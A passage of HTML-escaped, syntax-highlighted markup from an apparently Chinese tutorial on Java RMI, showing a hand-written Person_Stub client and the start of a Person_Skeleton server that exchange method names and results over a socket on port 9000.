function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用person_stub实现person&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用person_stub实现person&#34;&gt;#&lt;/a&gt; 使用 Person_Stub 实现 Person&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Stub&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Stub&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// connect to skeleton&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;computer_name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// pass method name to skeleton&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;age&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt; inStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; inStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// pass method name to skeleton&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt; inStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;inStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;skeleton的实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#skeleton的实现&#34;&gt;#&lt;/a&gt; Skeleton 的实现&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ServerSocket&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Thread&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; myServer&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; server&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// get reference of object server&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;myServer &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; server&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;// new socket at port 9000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;ServerSocket&lt;/span&gt; serverSocket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ServerSocket&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;// accept stub&#39;s request&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt; socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; serverSocket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token comment&#34;&gt;// get stub&#39;s request&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt; inStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; method &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;inStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token comment&#34;&gt;// check method 